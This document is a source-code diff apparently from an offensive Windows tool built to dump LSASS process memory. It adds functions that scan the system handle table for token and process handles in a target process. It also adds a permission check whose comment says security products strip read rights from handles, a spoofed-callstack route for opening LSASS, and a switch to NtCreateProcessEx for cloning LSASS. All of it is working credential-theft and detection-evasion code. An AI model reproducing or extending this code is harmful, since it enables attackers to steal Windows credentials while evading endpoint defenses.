@@ -3,8 +3,178 @@
 #include "dinvoke.h"
 #include "modules.h"
 #include "malseclogon.h"
+#include "spoof_callstack.h"
 
 #if defined(NANO) && !defined(SSP)
+
+PHANDLE_LIST find_token_handles_in_process(
+    IN DWORD process_pid,
+    IN DWORD permissions)
+{
+    BOOL success = FALSE;
+
+    DPRINT("Finding token handles in the process with PID %ld", process_pid);
+
+    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
+    if (!handle_list)
+    {
+        malloc_failed();
+        return NULL;
+    }
+
+    ULONG TokenTypeIndex = 0;
+    success = GetTypeIndexByName(TOKEN_HANDLE_TYPE, &TokenTypeIndex);
+    if (!success)
+    {
+        intFree(handle_list); handle_list = NULL;
+        return NULL;
+    }
+
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
+    if (!handleTableInformation)
+    {
+        intFree(handle_list); handle_list = NULL;
+        return NULL;
+    }
+
+    // loop over each handle
+    for (ULONG j = 0; j < handleTableInformation->Count; j++)
+    {
+        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
+
+        // make sure this handle is from the target process
+        if (handleInfo->UniqueProcessId != process_pid)
+            continue;
+
+        // make sure the handle has the permissions we need
+        if ((handleInfo->GrantedAccess & permissions) != permissions)
+            continue;
+
+        // make sure the handle is of type 'Token'
+        if (handleInfo->ObjectTypeIndex != TokenTypeIndex)
+            continue;
+
+        if (handle_list->Count + 1 > MAX_HANDLES)
+        {
+            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
+            intFree(handleTableInformation); handleTableInformation = NULL;
+            intFree(handle_list); handle_list = NULL;
+            return NULL;
+        }
+        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
+    }
+
+    intFree(handleTableInformation); handleTableInformation = NULL;
+    DPRINT("Found %ld handles", handle_list->Count);
+    return handle_list;
+}
+
+PHANDLE_LIST find_process_handles_in_process(
+    IN DWORD process_pid,
+    IN DWORD permissions)
+{
+    BOOL success = FALSE;
+
+    DPRINT("Finding process handles in the process with PID %ld", process_pid);
+
+    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
+    if (!handle_list)
+    {
+        malloc_failed();
+        return NULL;
+    }
+
+    ULONG ProcesTypeIndex = 0;
+    success = GetTypeIndexByName(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
+    if (!success)
+    {
+        intFree(handle_list); handle_list = NULL;
+        return NULL;
+    }
+
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
+    if (!handleTableInformation)
+    {
+        intFree(handle_list); handle_list = NULL;
+        return NULL;
+    }
+
+    // loop over each handle
+    for (ULONG j = 0; j < handleTableInformation->Count; j++)
+    {
+        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
+
+        // make sure this handle is from the target process
+        if (handleInfo->UniqueProcessId != process_pid)
+            continue;
+
+        // make sure the handle has the permissions we need
+        if ((handleInfo->GrantedAccess & permissions) != permissions)
+            continue;
+
+        // make sure the handle is of type 'Process'
+        if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
+            continue;
+
+        if (handle_list->Count + 1 > MAX_HANDLES)
+        {
+            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
+            intFree(handleTableInformation); handleTableInformation = NULL;
+            intFree(handle_list); handle_list = NULL;
+            return NULL;
+        }
+        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
+    }
+
+    intFree(handleTableInformation); handleTableInformation = NULL;
+    DPRINT("Found %ld handles", handle_list->Count);
+    return handle_list;
+}
+
+/*
+ * Some security products remove permissions from handles
+ * such as PROCESS_VM_READ. Make sure the handle has all
+ * the permissions that we requested
+ */
+BOOL check_handle_privs(
+    IN HANDLE handle,
+    IN DWORD permissions)
+{
+    BOOL ret_val = FALSE;
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    PUBLIC_OBJECT_BASIC_INFORMATION obj_info = { 0 };
+
+    status = NtQueryObject_(
+        handle,
+        ObjectBasicInformation,
+        &obj_info,
+        sizeof(PUBLIC_OBJECT_BASIC_INFORMATION),
+        NULL);
+    if (!NT_SUCCESS(status))
+    {
+        syscall_failed("NtQueryObject", status);
+        goto cleanup;
+    }
+
+    if ((obj_info.GrantedAccess & permissions) == permissions)
+    {
+        ret_val = TRUE;
+        DPRINT(
+            "The handle has the appropiate permissions: 0x%lx",
+            obj_info.GrantedAccess);
+    }
+    else
+    {
+        ret_val = FALSE;
+        DPRINT_ERR(
+            "The handle should have access permissions of 0x%lx but has 0x%lx",
+            permissions,
+            permissions & obj_info.GrantedAccess);
+    }
+
+cleanup:
+    return ret_val;
+}
 
 /*
  * "The DuplicateHandle system call has an interesting behaviour
@@ -49,6 +219,7 @@ HANDLE obtain_lsass_handle(
     IN DWORD permissions,
     IN BOOL dup,
     IN BOOL seclogon_race,
+    IN DWORD spoof_callstack,
     IN BOOL is_malseclogon_stage_2,
     IN LPCSTR dump_path)
 {
@@ -73,6 +244,13 @@ HANDLE obtain_lsass_handle(
     else if (seclogon_race)
     {
         hProcess = malseclogon_race_condition(lsass_pid);
+    }
+    else if (spoof_callstack)
+    {
+        hProcess = open_handle_with_spoofed_callstack(
+            spoof_callstack,
+            lsass_pid,
+            permissions);
     }
     // good old NtOpenProcess
     else if (lsass_pid)
@@ -467,27 +645,20 @@ HANDLE fork_process(
 
     // fork the LSASS process
     HANDLE hCloneProcess = NULL;
-    OBJECT_ATTRIBUTES CloneObjectAttributes;
 
-    InitializeObjectAttributes(
-        &CloneObjectAttributes,
-        NULL,
-        OBJ_CASE_INSENSITIVE,
-        NULL,
-        NULL);
-
-    NTSTATUS status = NtCreateProcess(
+    NTSTATUS status = NtCreateProcessEx(
         &hCloneProcess,
         GENERIC_ALL,
-        &CloneObjectAttributes,
+        NULL,
         hProcess,
-        TRUE,
+        CREATE_SUSPENDED,
         NULL,
         NULL,
-        NULL);
+        NULL,
+        0);
     if (!NT_SUCCESS(status))
     {
-        syscall_failed("NtCreateProcess", status);
+        syscall_failed("NtCreateProcessEx", status);
         DPRINT_ERR("Could not fork " LSASS);
         hCloneProcess = NULL;
     }
